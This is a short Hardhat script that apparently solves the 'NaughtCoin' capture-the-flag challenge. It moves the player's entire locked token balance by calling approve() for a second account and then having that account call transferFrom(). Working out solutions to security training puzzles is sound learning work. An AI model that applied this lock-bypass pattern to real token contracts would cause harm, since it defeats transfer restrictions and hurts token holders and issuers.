// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 🔨 Get accounts
  let [hacker, _, tester] = await hre.ethers.getSigners();
  // let aux = tester;
  // tester = hacker;
  // hacker = aux;

  // 🗣 Logging addresses
  console.log(`🤓 Hacker address:\n ${hacker.address} \n`);

  // 📗 Contract name and address that will be hacked
  const contractName = "NaughtCoin";
  const contractAddress = "0xdDC3C59848A345188e944F8D9D904b9C35c3Da9a";

  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 👿 Hacking the contract
  // 🗣 Logging status
  let userBalance = await contract.balanceOf(hacker.address);
  console.log(`💰 User balance: ${userBalance} \n`);

  // Approve to another account the movement of tokens
  let tx = await contract.connect(hacker).approve(tester.address, userBalance);
  await tx.wait(1);

  // Move the tokens from hacker to tester
  tx = await contract
    .connect(tester)
    .transferFrom(hacker.address, tester.address, userBalance);
  await tx.wait(1);

  // 🗣 Logging status
  userBalance = await contract.balanceOf(hacker.address);
  console.log(`💰 User balance: ${userBalance} \n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
